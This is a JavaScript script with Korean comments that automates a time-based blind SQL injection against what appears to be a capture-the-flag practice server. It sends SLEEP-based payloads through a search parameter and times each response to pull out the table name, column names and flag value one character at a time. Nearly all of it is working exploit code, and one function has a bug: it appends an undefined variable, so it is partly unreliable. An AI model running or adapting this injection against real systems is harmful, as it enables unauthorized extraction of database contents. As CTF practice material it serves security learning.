const characters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()-_=+[]{}|;:',.<>?/";

async function ctf() {
 const tableName = await findTableName()

 const columnNames= await ctf2(tableName);

 for(const columnName of columnNames){
  await ctf3(tableName, columnName)
 }
}
ctf();


async function ctf2(tableName) {
  let columnNames = [];

  for (let limit = 0; ; limit++) {
    console.log(`컬럼 이름 찾기 (LIMIT ${limit}):`);
    const columnName = await findColumnName(tableName, limit);
    
    // 컬럼 이름을 찾지 못한 경우 종료
    if (columnName === "") {
      break;
    }

    columnNames.push(columnName);
  }

  console.log("컬럼 이름들: ", columnNames);
  return columnNames
}

async function ctf3(tableName, columnName) {
  console.log("flag 값 찾기:");
  const flag = await findValueName(tableName, columnName);
  console.log("flag 값: ", flag);
}

async function findTableName(){
  // 테이블 이름 찾기
  let tableName = ''
  for (let j = 1; ; j++) {
    let found = false;

    for (let i = 0; i < characters.length; i++) {
      const char = characters[i];
      const script = `doldol' AND IF(SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 1 OFFSET 2), ${j}, 1) = '${char}', SLEEP(1), 0); #`;
      const encodedScript = encodeURIComponent(script);

      const url = `http://ctf.segfaulthub.com:7777/sqli_5/search.php?search=${encodedScript}`;

      // 현재 시각 기록
      const startTime = Date.now();

      // 요청 보내기
      const result = await fetch(url);

      // 응답 받은 후의 시각 기록
      const endTime = Date.now();

      // 응답 시간 계산
      const responseTime = endTime - startTime;

      // 응답 시간이 1초 이상인 경우에만 해당 문자를 테이블 이름에 추가
      if (responseTime >= 1000) {
        tableName += column;
        console.log("테이블 이름: ", tableName);
        found = true;
        break;
      }
    }

    // 문자를 찾지 못한 경우 종료
    if (!found) {
      break;
    }
  }
  return tableName
}


async function findColumnName(tableName, limit) {
let columnName = "";

for (let j = 1; ; j++) {
  let found = false;

  for (let i = 0; i < characters.length; i++) {
    const char = characters[i];
    const script = `doldol' AND IF(SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_name='${tableName}' LIMIT ${limit},1), ${j}, 1) = '${char}', SLEEP(1), 0); #`;
    const encodedScript = encodeURIComponent(script);

    const url = `http://ctf.segfaulthub.com:7777/sqli_5/search.php?search=${encodedScript}`;

    // 현재 시각 기록
    const startTime = Date.now();

    // 요청 보내기
    const result = await fetch(url);

    // 응답 받은 후의 시각 기록
    const endTime = Date.now();

    // 응답 시간 계산
    const responseTime = endTime - startTime;

    // 응답 시간이 1초 이상인 경우에만 해당 문자를 컬럼 이름에 추가
    if (responseTime >= 1000) {
      columnName += char;
      console.log("컬럼 이름: ", columnName);
      found = true;
      break;
    }
  }

  // 문자를 찾지 못한 경우 종료
  if (!found) {
    break;
  }
}

return columnName;
}




async function findValueName(tableName, columnName) {
let flagValue = "";

for (let j = 1; ; j++) {
  let found = false;

  for (let ascii = 32; ascii < 127; ascii++) {  // ASCII 범위 내의 모든 문자
    const char = String.fromCharCode(ascii);
    const script = `doldol' AND IF(ASCII(SUBSTRING((SELECT ${columnName} FROM ${tableName} LIMIT 1 OFFSET 1), ${j}, 1)) = ${ascii}, SLEEP(1), 0); #`;
    const encodedScript = encodeURIComponent(script);

    const url = `http://ctf.segfaulthub.com:7777/sqli_5/search.php?search=${encodedScript}`;

    // 현재 시각 기록
    const startTime = Date.now();

    // 요청 보내기
    const result = await fetch(url);

    // 응답 받은 후의 시각 기록
    const endTime = Date.now();

    // 응답 시간 계산
    const responseTime = endTime - startTime;

    // 응답 시간이 1초 이상인 경우에만 해당 문자를 flag 값에 추가
    if (responseTime >= 1000) {
      flagValue += char;
      console.log("현재 flag 값: ", flagValue);
      found = true;
      break;
    }
  }

  // 문자를 찾지 못한 경우 종료
  if (!found) {
    break;
  }
}

return flagValue;
}